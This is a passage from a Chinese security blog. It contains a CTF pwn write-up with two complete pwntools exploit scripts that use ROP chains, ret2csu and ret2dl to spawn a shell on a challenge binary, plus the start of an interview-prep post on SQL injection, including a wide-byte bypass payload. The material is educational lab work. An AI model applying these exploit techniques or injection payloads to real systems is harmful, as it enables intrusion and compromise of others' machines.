class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个模板中，你需要在 <code># 这里添加你的攻击代码</code> 的位置编写攻击代码，然后通过 <code>conn.send</code> 或者 <code>conn.sendline</code> 发送攻击代码。具体的攻击代码需要根据二进制程序的细节来编写。</p><ul><li><p>“栈溢出漏洞”：这是指由于程序没有正确的检查输入的长度，导致可以向一个栈分配的缓冲区写入过多的数据，从而覆盖其他在栈上的数据。在你的程序中，这种情况发生在 <code>main</code> 函数中，当程序尝试从标准输入读取256字节的数据并将其存储在一个只有16字节的缓冲区中。</p></li><li><p>“NX”：这是一个安全机制，全称为 “No eXecute”，也被称为 “Data Execution Prevention (DEP)”。启用了 NX 之后，程序不能执行存储在数据段（如堆和栈）的代码。这使得攻击者不能简单地向缓冲区写入一段代码然后执行。</p></li><li><p>“没有开启 PIE”：PIE 是 “Position Independent Executable” 的缩写。如果没有启用 PIE，那么程序每次执行时都会被加载到同一个内存地址。这使得攻击者可以预知代码段的地址，这在进行ROP攻击时是非常有用的。</p></li><li><p>“ROP（Return-oriented programming）”：这是一种利用已经存在于内存中的代码片段（称为 “gadgets”）来绕过NX的技术。由于程序的代码段是可执行的，攻击者可以通过修改栈上的返回地址，让程序执行代码段中的一段代码，然后返回，再执行另一段代码，以此类推。</p></li><li><p>“linkmap”：在 Linux 中，当一个动态库被加载时，会有一个称为 “linkmap” 的数据结构来存储有关该库的信息。这个数据结构中包含了动态库的加载地址，以及一些其他的信息。攻击者可以通过读取和解析这个数据结构，来找到动态库中函数的实际地址，从而绕过地址随机化（ASLR）。</p></li><li><p>“ASLR”：这是 “Address Space Layout Randomization” 的缩写，是一个安全机制，它会在每次程序执行时随机化内存的布局，使得攻击者不能预知代码和数据的地址。然而，由于你的程序没有启用 PIE，并且动态库的加载地址可以通过解析 linkmap 来获取，所以攻击者可以绕过 ASLR。</p></li></ul><h3 id="ret2csu-exp-py（非预期）"><a href="#ret2csu-exp-py（非预期）" class="headerlink" title="ret2csu  -  exp.py（非预期）"></a>ret2csu  -  exp.py（非预期）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import* # 导入pwn库，包含了大量的工具来创建和交互与远程服务或者本地进程，便于二进制漏洞利用context.log_level='debug' # 设置日志级别为debug，这样程序会打印出所有的交互数据context.arch='amd64' # 设置目标的架构为amd64s = lambda data : p.send(data) # 定义函数s，发送数据到目标sl = lambda data : p.sendline(data) # 定义函数sl，发送数据到目标并附带一个换行符sa = lambda text, data : p.sendafter(text, data) # 定义函数sa，等待接收到特定的文本后发送数据sla = lambda text, data : p.sendlineafter(text, data) # 定义函数sla，等待接收到特定的文本后发送数据并附带一个换行符r = lambda : p.recv() # 定义函数r，接收数据rn = lambda x  : p.recvn(x) # 定义函数rn，接收指定数量的数据ru = lambda text : p.recvuntil(text) # 定义函数ru，接收数据直到接收到特定的文本dbg = lambda text=None  : gdb.attach(p, text) # 定义函数dbg，附加gdb到目标进程uu32 = lambda : u32(p.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00')) # 定义函数uu32，接收数据并转换为32位无符号整数uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) # 定义函数uu64，接收数据并转换为64位无符号整数lg = lambda s : log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s))) # 定义函数lg，打印带有颜色的日志信息pr = lambda s : print('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s))) # 定义函数pr，打印带有颜色的字符串# 定义函数mydbg，附加gdb并连接到ida进行远程调试def mydbg():  gdb.attach(p,"decompiler connect ida --host 192.168.1.102 --port 3662 ")  pause()# 定义一些在ROP攻击中需要用到的地址pop_rdi=0x00000000004007e3pop_rsi=0x00000000004007e1bss_0601040=0x0601040pop_rsp=0x00000000004007ddread_plt=0x4004E0read_got=0x600FD8pop6_addr=0x4007DAmov_addr=0x04007C0bss_addr=0x601200ret=0x00000000004004c9i=0 # 初始化变量i为0while True: # 死循环    try:        lg("i") # 打印日志信息，输出i的值        i=i+1 # i加1        # p=remote("pwn-1f975f76e2.challenge.xctf.org.cn", 9999, ssl=True) # 连接远程服务        p=process('./ezzzz') # 启动本地进程        elf=ELF('./ezzzz') # 打开本地的ELF文件        libc=elf.libc # 获取本地的libc库        # 构造ROP链并发送        payload=b'a'*0x18+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_0601040)+p64(0)+p64(read_plt)+p64(pop_rdi)+p64(0)+p64(0x400606)        payload+=p64(pop6_addr)+p64(0)+p64(1)+p64(read_got)+p64(0x300)+p64(bss_addr)+p64(0)+p64(mov_addr)+p64(0)*7        payload+=p64(pop_rsp)+p64(bss_addr)        mydbg() # 附加gdb并连接到ida进行远程调试        sl(payload) # 发送ROP链        pause() # 暂停        sl(p64(read_got)) # 发送read_got的地址        # 构造第二个ROP链并发送        payload=p64(0)*3+p64(pop6_addr)+p64(0)+p64(1)+p64(read_got)+p64(8)+p64(bss_0601040-6)+p64(0)+p64(mov_addr)+p64(0)*7        payload+=p64(pop6_addr)+p64(0)+p64(1)+p64(bss_0601040)+p64(0x8)+p64(read_got)+p64(1)+p64(mov_addr)+p64(0)*7        payload+=p64(pop6_addr)+p64(0)+p64(1)+p64(read_got)+p64(0x100)+p64(bss_addr+0xa00)+p64(0)+p64(mov_addr)+p64(0)*7        payload+=p64(pop_rsp)+p64(bss_addr+0xa00)        pause() # 暂停        sl(payload) # 发送第二个ROP链        pause() # 暂停        s("\x00\x00\x00\x00\x00\x00\x20\x4a") # 发送数据        libc_base=uu64()-libc.sym['read'] # 计算libc的基地址        system=libc_base+libc.sym['system'] # 计算system函数的地址        binsh=libc_base+next(libc.search(b"/bin/sh")) # 计算"/bin/sh"字符串的地址        lg("libc_base") # 打印日志信息，输出libc_base的值        # 构造第三个ROP链并发送        payload=p64(0)*3+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)        pause() # 暂停        sl(payload) # 发送    p.interactive() # 开始交互模式，此时可以输入shell命令，如ls，pwd等，并看到结果    except EOFError: # 如果捕获到EOFError异常        p.close() # 关闭与目标的连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="三、这个脚本运行的大致步骤是："><a href="#三、这个脚本运行的大致步骤是：" class="headerlink" title="三、这个脚本运行的大致步骤是："></a>三、这个脚本运行的大致步骤是：</h3><ol><li><p>启动目标进程。</p></li><li><p>构造一个ROP链，用于泄露”read”函数的地址，从而计算出libc库的基地址。</p></li><li><p>利用计算出的libc库的基地址，构造一个新的ROP链，用于调用”system”函数执行”/bin/sh”命令。</p></li><li><p>如果目标进程在这个过程中退出了（可能是因为ROP链有错误，或者因为防御机制阻止了攻击），则开始下一轮的尝试。、</p><p>在这个脚本中，攻击者首先通过 sub_400606 函数泄露了 read 函数在 libc 中的实际地址，然后通过地址偏移计算出 libc 的基址，以及 system 函数和 “/bin/sh” 字符串在 libc 中的地址，然后构造 payload，将返回地址修改为 system 函数的地址，实现执行任意命令，这是一个典型的 ret2libc 攻击。</p></li></ol><h3 id="四、ret2csu"><a href="#四、ret2csu" class="headerlink" title="四、ret2csu"></a>四、ret2csu</h3><p>这是一个有关二进制漏洞利用的问题，主要采用了 Return Oriented Programming (ROP)，”ret2csu”，和栈迁移技术来执行任意代码。程序开启了”full relro”，防止了对.got表的直接修改，因此不能直接使用dl-resolve技巧来构造任意函数调用。</p><p>这个解题思路是在IDA中找到一个特别的函数sub_400606。这个函数读取了一个特定地址（在这里是601040 + a1）处的值，然后写回到相同的地址。因此，如果a1为0，那么这个函数就实际上进行了一次地址的取值操作。这种特性可以被用来读取read函数在.got表中的地址，然后将read的libc地址写入到601040处。</p><p>解题人还发现了，对于他们所使用的libc版本（2.35），read和write函数在libc中的地址仅相差最后两个字节。因此，解题人可以尝试多次改变601040处的值，使其变为write的libc地址，这可以通过改变read的.got表项来实现。注意，在此过程中，他们并未直接修改.got表，而是修改了该地址在内存中的一个副本，这样就绕过了full relro的限制。</p><p>接下来，他们使用”write”函数来泄露read在.got表中的地址，从而计算出libc的基址。有了libc的基址，就可以找到system函数的地址，并使用”/bin/sh”字符串来调用它，从而获得一个shell。</p><p>“ret2csu”是一种利用程序的__libc_csu_init函数中的一段gadget来进行任意函数调用的技术。在这个题解中，解题人使用它来调用sub_400606函数和write函数。</p><p>“栈迁移”则是将栈指针（rsp）移动到新的位置，通常是为了获得更多的可控空间，或者绕过某些防护机制。在这个题解中，解题人通过栈迁移来构造长的ROP链。</p><h3 id="五、"><a href="#五、" class="headerlink" title="五、"></a>五、</h3><p>当寻找二进制漏洞和构建漏洞利用链时，研究者并不总是仅限于查看main函数。虽然main函数是程序的入口点，但是它可能并不包含可以被利用的漏洞或者有用的函数。此外，有时候，main函数中的代码可能由于各种原因（比如控制流保护机制）而无法被直接利用。</p><p>在这种情况下，研究者会在整个程序的代码中寻找可以被利用的函数或片段（也被称为”gadget”）。这些函数或片段可能位于任何地方，包括库函数、系统调用，或者其他不常用的函数。它们的特性可能有助于绕过某些保护机制，或者提供了执行特定操作的能力，比如修改内存、执行系统调用、或者跳转到其他位置。</p><p>在这个问题中，研究者发现了函数sub_400606，它具有特殊的属性，可以用于读取和修改内存，这对于构建漏洞利用链是非常有用的。这也就是为什么他们会去查看并使用这个函数，而不是只关注main函数。</p><p>总的来说，寻找和利用二进制漏洞需要对整个程序的代码进行全面的分析和理解，而不仅仅是main函数。这也是二进制漏洞分析和利用的一项重要技能。</p><h3 id="六、利用已知地址制造栈溢出"><a href="#六、利用已知地址制造栈溢出" class="headerlink" title="六、利用已知地址制造栈溢出"></a>六、利用已知地址制造栈溢出</h3><p>栈溢出是一种常见的漏洞，通过编写超出预定缓冲区大小的数据，可以覆盖掉在内存中后续的数据，比如函数返回地址。一旦函数返回地址被覆盖，就可以改变程序的执行流程。</p><p>在经典的栈溢出利用场景中，常常会看到通过泄露 libc 函数（例如 puts、printf 等）的地址来绕过 ASLR(Address Space Layout Randomization，地址空间布局随机化)的保护。因为在启动 ASLR 保护的情况下，每次程序启动时，动态库（例如 libc.so）的加载地址是随机的。通过泄露某个已知函数的实际运行时地址，可以计算出动态库的基地址，进一步找到其他函数（例如 system）的地址，从而绕过 ASLR。</p><p>在这个问题中，你可能在看到没有 puts 或者类似函数来泄露地址时会感到困惑。但其实，这个题目中，利用的是 sub_400606 函数的特性，把 read 的 got 表项地址写入到 601040，然后通过执行 sub_400606 函数，将 read 在 libc 中的实际地址写入到 601040，从而实现了信息泄露。通过这种方式，可以得到 libc 中 read 函数的实际地址，从而可以计算出 libc 的基地址。</p><p>所以这是一种不同于经典的通过泄露函数地址来绕过 ASLR 的方法，而是通过利用程序特性来泄露信息，达到绕过 ASLR 的目的。</p><p>根据你给出的题解中对 sub_400606 函数的分析，该函数的功能是读取特定内存位置的值（在 qword_601040 + a1 的位置），并将这个值写入到其他的特定内存位置。</p><p>这个函数没有明确的任务，它只是对内存进行操作，具体的用途则取决于这个函数在程序中被如何使用。</p><p>现在来解释为什么把 read 的 GOT 表项地址写入 601040 后，执行 sub_400606 函数后写入 601040 的却是 read 在 libc 中的实际地址。</p><p>这是因为，在程序执行过程中，当执行到调用 read 函数的位置时，程序实际上会跳转到 GOT 表中的 read 表项的地址去执行。而这个 read 表项的地址中，保存的是 read 函数在 libc 中的实际地址（这是程序在加载时动态链接器做的事情）。也就是说，这个 GOT 表项其实是一个指针，指向 libc 中的 read 函数。</p><p>因此，如果我们把 read 的 GOT 表项地址写入 601040，然后执行 sub_400606 函数，函数就会去读取 qword_601040 + a1 的值，这里实际上就是读取的 read 的 GOT 表项，也就是 read 函数在 libc 中的实际地址。然后，这个函数又把这个地址写入了 601040，实现了信息泄露。</p><h3 id="七、函数定义"><a href="#七、函数定义" class="headerlink" title="七、函数定义"></a>七、函数定义</h3><ol><li><code>s = lambda data : p.send(data)</code>：这是一个匿名函数，简化了p.send(data)的操作，可以用<code>s(data)</code>的方式发送数据，其中<code>p</code>是一个socket对象，代表目标程序的一个连接。</li><li><code>sl = lambda data : p.sendline(data)</code>：这个函数将给定的数据以一行的形式发送给目标程序。它在数据末尾添加一个换行符(‘\n’)，因为某些程序的输入是按行接收的。</li><li><code>sa = lambda text, data : p.sendafter(text, data)</code>：这个函数将等待目标程序输出特定的文本，然后发送数据。这个函数在输入需要同步特定输出时很有用。</li><li><code>sla = lambda text, data : p.sendlineafter(text, data)</code>：这个函数和<code>sa</code>的功能类似，但是在发送数据时会自动添加换行符。</li><li><code>r = lambda : p.recv()</code>：这个函数简化了接收数据的操作，可以直接用<code>r()</code>接收目标程序发送的数据。</li><li><code>rn = lambda x : p.recvn(x)</code>：这个函数可以接收指定数量的数据。</li><li><code>ru = lambda text : p.recvuntil(text)</code>：这个函数将从目标程序接收数据，直到遇到特定的文本。</li><li><code>dbg = lambda text=None : gdb.attach(p, text)</code>：这个函数将GDB附加到目标进程上，可以用来进行调试。</li><li><code>uu32 = lambda : u32(p.recvuntil(b"\xf7")[-4:].ljust(4, b'\x00'))</code>：这个函数从目标程序接收数据，并将接收到的4个字节数据转换为32位无符号整数。</li><li><code>uu64 = lambda : u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))</code>：这个函数从目标程序接收数据，并将接收到的6个字节数据转换为64位无符号整数。</li><li><code>lg = lambda s : log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s)))</code>：这个函数打印带有颜色的日志信息，红色的部分是变量名，其后的十六进制数值是变量值。</li><li><code>pr = lambda s : print('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s, eval(s)))</code>：这个函数打印带有颜色的字符串，和<code>lg</code>类似。</li></ol><p>无符号数并不一定是十六进制的，无符号数只是一种表示整数的方式，它只能表示非负整数。十六进制是一种数制，可以用来表示任何整数，无论是有符号的还是无符号的。</p><p>函数<code>u32(data)</code>是一个在pwntools库中常用的函数，它将一个包含4个字节的字符串或字节串转换为一个32位的无符号整数。这个函数常常用在二进制漏洞利用中，例如在处理来自目标程序的内存泄漏信息时。</p><p>当函数<code>uu32</code>被调用时，它将从目标程序接收数据，直到接收到字节0xf7（在ASCII中，0xf7对应的字符是除号’÷’）。然后，它会取接收到的数据的最后4个字节，并使用<code>ljust(4, b'\x00')</code>来确保这个字节串的长度至少为4字节。如果长度不足4字节，就会在其左侧（高位）补充零字节，直到长度达到4字节。最后，它将这4个字节的数据使用<code>u32</code>函数转换为一个32位的无符号整数。</p><p>这里涉及的字节串到整数的转换是基于小端字节序的，也就是说，字节串的低位字节对应整数的低位字节。这是因为x86和x86_64架构的计算机使用小端字节序，而大多数二进制漏洞利用目标程序都运行在这些架构的计算机上。</p><h3 id="八、uu32-x3D-lambda-u32-p-recvuntil-b”-xf7”-4-ljust-4-b’-x00’"><a href="#八、uu32-x3D-lambda-u32-p-recvuntil-b”-xf7”-4-ljust-4-b’-x00’" class="headerlink" title="八、uu32 = lambda : u32(p.recvuntil(b”\xf7”)[-4:].ljust(4, b’\x00’))"></a>八、uu32 = lambda : u32(p.recvuntil(b”\xf7”)[-4:].ljust(4, b’\x00’))</h3><p>这行代码定义了一个名为<code>uu32</code>的函数，这个函数没有输入参数。接下来我会逐一解释这个函数的每个部分。</p><ul><li><p><code>lambda</code>：在Python中，<code>lambda</code>是用来创建匿名函数的关键字。匿名函数是指没有名字的函数，只有参数列表和表达式。这里，<code>lambda</code>关键字之后的冒号(:)之前是输入参数的位置，这里没有输入参数。冒号之后的部分是该函数的主体。</p></li><li><p><code>p.recvuntil(b"\xf7")</code>：这是调用<code>p</code>对象的<code>recvuntil</code>方法，该方法会从与之相连的流中读取数据，直到遇到指定的字节序列。在这里，指定的字节序列是<code>b"\xf7"</code>。这行代码会返回从流开始到指定字节序列的所有数据。</p></li><li><p><code>[-4:]</code>：这是一个切片操作符，用于获取字符串的一个子集。在这里，它用于获取从接收的数据的最后四个字节。</p></li><li><p><code>.ljust(4, b'\x00')</code>：这是Python字符串的<code>ljust</code>方法，用于对字符串进行左对齐并填充指定的字符到指定的宽度。在这里，它用于确保获取的四个字节的数据长度至少为4个字节。如果获取的数据少于4个字节，那么将在右侧添加<code>\x00</code>字节，直到长度为4。</p></li><li><p><code>u32()</code>：这是<code>pwntools</code>库中的一个函数，用于将四字节的字符串解析为一个32位无符号整数。在这里，它用于将获取的四个字节的数据解析为一个32位无符号整数。</p></li></ul><p>总结一下，这个函数的工作流程是：</p><ol><li>从与之相连的流中读取数据，直到遇到指定的字节序列（<code>b"\xf7"</code>）。</li><li>获取读取的数据的最后四个字节。</li><li>确保获取的数据长度为4个字节，如果不够则在右侧添加<code>\x00</code>字节。</li><li>将获取的四个字节的数据解析为一个32位无符号整数。</li></ol><h3 id="九、转化为无符号字符（十进制）"><a href="#九、转化为无符号字符（十进制）" class="headerlink" title="九、转化为无符号字符（十进制）"></a>九、转化为无符号字符（十进制）</h3><p>在二进制漏洞利用中，将泄露的信息转换为无符号整数有很多重要的原因：</p><ol><li><p>计算机内部表示和处理数据的方式：计算机在内部使用二进制表示和处理所有的数据。这包括指令、地址、字符、整数等等。因此，当我们从一个程序中获得一些原始的二进制数据（例如，通过一个内存泄露漏洞），我们通常需要将这些数据转换为我们想要的格式以便于处理。在很多情况下，我们需要将这些数据看作是无符号整数，例如内存地址或者函数的偏移量。</p></li><li><p>无符号整数的范围更大：相对于有符号整数，无符号整数可以表示更大的正整数范围。在处理内存地址或者大的数据偏移量时，这一点是非常重要的。例如，一个32位的有符号整数只能表示从-2147483648到2147483647的整数，但是一个32位的无符号整数可以表示从0到4294967295的整数。</p></li><li><p>可移植性和兼容性：无符号整数在不同的计算机架构和操作系统之间有更好的可移植性和兼容性。对于二进制漏洞利用，我们通常需要在不同的环境中进行测试和验证，因此需要使用可以在所有环境中一致工作的数据类型。</p></li></ol><p>最后，需要注意的是，虽然这里我们将数据转换为无符号整数，但这并不意味着我们总是要这样做。在不同的情况下，我们可能需要将数据转换为其他的类型，例如字符串或者有符号整数。数据应该被转换为什么类型，取决于我们希望如何使用这些数据。</p><h3 id="十、retcsu和ret2dl"><a href="#十、retcsu和ret2dl" class="headerlink" title="十、retcsu和ret2dl"></a>十、retcsu和ret2dl</h3><p><code>ret2csu</code>和<code>ret2dl</code>都是一种返回导向编程（ROP, Return Oriented Programming）攻击方法，他们都是在exploit开发中用于绕过各种内存保护机制（如NX，DEP等）的常用技术。下面分别介绍一下它们：</p><ol><li><p><strong>ret2csu</strong>:<br>“csu”代表”C standard library startup routines”，这种方法使用程序在初始化过程中自动生成的一段代码（称为csu初始化函数）。<code>ret2csu</code>被用来调用程序已经链接的库中的函数，即使这个函数在程序的plt（过程链接表）中没有条目。这种技术允许我们调用任意函数并设置函数参数，它通常用于调用像read或write这样的函数来泄露内存信息，或者调用system函数来获得shell。</p></li><li><p><strong>ret2dl</strong>:<br>“dl”代表”dynamic linker”，<code>ret2dl</code>是一种特殊的ROP技巧，主要用于全局偏移表（GOT）完全只读（Full RELRO）的情况。在这种情况下，不能简单地通过GOT覆盖来调用任意的函数。<code>ret2dl</code>主要是利用动态链接器的某些功能，通过构造特殊的链接结构来构造任意函数调用。</p></li></ol><p>这两种方法的主要区别在于，<code>ret2csu</code>是利用程序初始化过程中的代码，而<code>ret2dl</code>则是利用动态链接器的功能。此外，<code>ret2csu</code>通常用于没有开启全局偏移表完全只读（Full RELRO）保护的程序，而<code>ret2dl</code>则可以在开启这种保护的程序中使用。</p><h3 id="十一、"><a href="#十一、" class="headerlink" title="十一、"></a>十一、</h3><p>在这里，所有的地址都是在二进制文件中找到的。你可以使用各种二进制分析工具（比如<code>objdump</code>、<code>readelf</code>或者<code>Ghidra</code>、<code>IDA Pro</code>等）来获取这些地址。这里我们简单解释一下每一个地址是如何找到的。</p><ol><li><p><code>pop_rdi=0x00000000004007e3</code>, <code>pop_rsi=0x00000000004007e1</code>, <code>pop_rsp=0x00000000004007dd</code> 和 <code>pop6_addr=0x4007DA</code> 这些地址是通过在二进制中搜索 ROP gadgets 得到的。这些 gadgets 是一些短的指令序列，后面通常紧跟着一个 <code>ret</code> 指令，被用来在构建 ROP 链时调整栈和寄存器的状态。你可以使用 <code>ROPgadget</code> 这样的工具来搜索这些 gadgets。</p></li><li><p><code>bss_0601040=0x0601040</code> 和 <code>bss_addr=0x601200</code> 这两个地址是在 ELF 文件的 BSS 段中找到的，这个区域常常用来存放程序中未初始化的全局变量。你可以使用 <code>readelf -S</code> 命令来查看 ELF 文件的各个段和它们的地址。</p></li><li><p><code>read_plt=0x4004E0</code> 和 <code>read_got=0x600FD8</code> 这两个地址是 read 函数在 PLT 和 GOT 表中的地址。你可以通过查看二进制文件的符号表或者使用工具如 <code>objdump -d</code> 或 <code>readelf -r</code> 来找到这些地址。</p></li><li><p><code>mov_addr=0x04007C0</code> 这个地址可能是从二进制中分析特定函数或者功能找到的，你可能需要使用反汇编工具或者动态调试工具（比如 <code>GDB</code>、<code>IDA Pro</code> 等）来找到这个地址。</p></li><li><p><code>ret=0x00000000004004c9</code> 这个地址通常是一个执行 <code>ret</code> 指令的地址，也可以使用工具如 <code>ROPgadget</code> 找到。</p></li></ol><p>注意，这些地址通常是在未开启地址空间布局随机化（ASLR）的环境中固定的。如果目标环境开启了 ASLR，那么你可能需要通过某种方式（如泄露信息或者布鲁特力猜测）来动态地获取这些地址。</p><h3 id="ret2dl-exp-py"><a href="#ret2dl-exp-py" class="headerlink" title="ret2dl exp.py"></a>ret2dl exp.py</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context.log_level='debug'  # 设置日志级别为debug，会输出更多调试信息# io=process('./ezzzz')  # 本地调试使用这行io=remote("pwn-12b3fb054a.challenge.xctf.org.cn", 9999, ssl=True)  # 连接远程服务器# 找到ROP链中使用的一些gadget的地址pop_rdi=0x4007E3  # gadget: pop rdi; retpop_rsi=0x4007E1  # gadget: pop rsi; pop r15; ret# 构造第一次的payload并发送pay=b'a'*0x10+p64(0x601c00)+p64(0x400752)io.send(pay)sleep(1)  # 等待1秒让程序处理输入# 构造第二次的payload并发送pay=b'/bin/sh\x00'+p64(59)+p64(0x601c00)pay+=p64(pop_rdi)+p64(0x600fd8)+p64(pop_rsi)pay+=p64(1)*2+p64(0x400606)+p64(0x400510)io.send(pay)# 构造第三次的payload并发送pay=b'/bin/sh\x00'+p64(59)+p64(0x601c00)pay+=p64(pop_rdi)+p64(0)+p64(pop_rsi)pay+=p64(0x601040)*2+p64(0x4004e0)+p64(0x400510)sleep(0.5)  # 等待0.5秒让程序处理输入io.send(pay)sleep(0.5)  # 等待0.5秒让程序处理输入io.send('\x90')  # 发送一个NOP（无操作）指令# 构造第四次的payload并发送pay=b'/bin/sh\x00'+p64(59)+p64(0x601c00)pay+=p64(pop_rdi)+p64(0)+p64(pop_rsi)pay+=p64(0x6010d0)*2+p64(0x4004e0)+p64(0x4007DA)pay+=p64(0)+p64(1)+p64(0x601040)+p64(0)+p64(0)+p64(0x601c00-0x10)pay+=p64(0x4007C0)sleep(0.5)  # 等待0.5秒让程序处理输入io.send(pay)# gdb.attach(io)  # 如果需要，可以在此处附加gdb进行调试sleep(0.5)  # 等待0.5秒让程序处理输入# 发送一些额外的数据，可能用于填充缓冲区io.send(b'a'*0x3b)# 尝试获取flagio.sendline('cat flag')io.recv()# 进入交互模式，可以手动输入命令和接收输出io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="二、web（hellosql）"><a href="#二、web（hellosql）" class="headerlink" title="二、web（hellosql）"></a>二、web（hellosql）</h2><p>平平无奇的sql注入,</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 巅峰极客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>彪的HW面经（第二版）</title>
      <link href="/du-yu/interview-4.html"/>
      <url>/du-yu/interview-4.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、TOP10"><a href="#一、TOP10" class="headerlink" title="一、TOP10"></a>一、TOP10</h2><pre class="line-numbers language-none"><code class="language-none">1.SQL注入2.失效的身份认证和会话管理3.跨站脚本攻击XSS4.直接引用不安全的对象5.安全配置错误6.敏感信息泄露7.缺少功能级的访问控制8.跨站请求伪造CSRF 9.实验含有已知漏洞的组件10.未验证的重定向和转发<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="一、sql注入"><a href="#一、sql注入" class="headerlink" title="一、sql注入"></a>一、sql注入</h2><p>sql注入的<strong>原理</strong>：<strong>利用应用程序没有正确过滤或转义用户输入的数据</strong>，<strong>导致恶意用户可以在 应用的查询语句中插入自己的SQL代码并传递</strong></p><p><strong>给后台SQL服务器 时加以解析并执行</strong>。这通常是因为应用程序没有有效地验证和处理用户输入数据，从而允许攻击者在输入框中输入特定的字符或语句，以绕过应用程序的安全性措施。</p><pre class="line-numbers language-none"><code class="language-none">把用户输入的数据当作代码执行。 包含两个关键条件： 一：用户能够控制输入；二：原本程序要执行的代码，拼接了用户输入的数据。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>例如，如果一个应用程序允许用户在登录时输入用户名和密码，但没有正确地过滤输入的数据，那么攻击者可以尝试在用户名或密码字段中输入SQL查询的一部分，从而绕过身份验证，甚至执行任意的数据库操作。</p><p>因此，要防止SQL注入攻击，应用程序需要对所有用户输入进行严格的验证和处理，以确保任何输入的数据都被正确地过滤、转义或编码，从而避免可能导致注入攻击的特殊字符或语句被传递到数据库服务器。</p><p><strong>sql的类型有什么</strong>    ：</p><p>常见（联合查询，布尔，延时，报错），其他（宽字节，堆叠，等等）</p><pre class="line-numbers language-none"><code class="language-none">数字型、字符型、GRT 注入、POST 注入、cookie 注入、布尔盲注、时间盲注、延时注入、编码注入、联合查询注入、堆查询注入等- 根据数据的传输方式  - GET 类型  - POST 类型  - COOKIE 类型- 根据数据的类型  - 数字型  - 字符型- 根据注入的模式  - 基于联合查询的注入模式  - 基于报错的注入模式  - 基于布尔的盲注  - 基于时间的盲注  - 基于查询的注入模式<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>sql注入宽字节的原理：</strong></p><p>目标站点对于特殊字符的转义（单双引号）前面会添加斜杠/，斜杠/ url 编码是 %5c，如果目标站点使用的是 gbk 编码，则可以构造 payload %df 加 单引号，%df 与%5c 进行结合成为一个汉字，而单引号则逃逸了出去。</p><p><strong>sql注入经常出现的地方</strong></p><ul><li><p>内部实现 / 流程的角度</p><p>url 传参、表单 post、Cookie、User-Agent、X-Forwarded-For…</p></li><li><p>业务点</p><p>新闻 / 商品等查询处、用户注册 / 登陆处、修改用户资料时、找回密码处、搜索框…</p></li></ul><p>简言之：一切可以与数据库进行交互的地方。</p><p><strong>SQL 注入的一般步骤</strong></p><ul><li>求闭合字符</li><li>选择注入模式</li><li>爆数据库</li><li>爆表名</li><li>爆列名</li><li>爆字段</li></ul><p><strong>sql类型介绍</strong>：</p><ol><li>基于错误的注入（Error-Based Injection）：该类型的 SQL 注入利用应用程序返回的错误信息来进行攻击，例如通过构造带有语法错误的查询来触发错误信息，攻击者可以从错误消息中获得关于数据库架构和数据的重要信息。</li><li>盲注注入（Blind Injection）：在盲注注入中，攻击者无法直接获取数据库返回的信息，因此需要通过其他方式来推断相关数据。例如，攻击者可以<strong>利用时间延迟等机制来判断是否成功注入恶意的SQL语句。</strong></li><li>基于联合查询的注入（Union-Based Injection）：攻击者可以利用 UNION SELECT 语句将两个或多个结果集组合在一起，以获取额外的信息或绕过认证检查。攻击者通常会尝试通过添加 UNION SELECT 语句来向查询中添加恶意代码，例如向<strong>查询结果集中添加用户列表或密码信息。</strong></li><li>基于布尔逻辑的注入（Boolean-Based Injection）：在这种类型的 SQL 注入中，攻击者会构造一个查询，<strong>该查询会返回一个布尔值</strong>，例如真或假。攻击者可以<strong>利用这些查询来推断数据库中的数据，例如使用 WHERE 子句构造一个布尔查询来检查某个字段是否存在。</strong></li><li>时间延迟注入（Time-Based Injection）：在时间延迟注入中，攻击者通过<strong>向查询中添加时间延迟语句来判断查询是否成功执行</strong>。例如，攻击者可以使用 <strong>SLEEP()</strong> 函数 来强制查询等待一段时间，在等待期间<strong>观察程序的响应时间来确定注入点是否存在</strong>。</li></ol><p>总之，在实际的 SQL 注入攻击中，攻击者通常会结合多种技术和手段，以达到其攻击目的。因此，开发人员需要采取适当的防御措施，例如输入验证、参数化查询、白名单过滤等，来避免 SQL 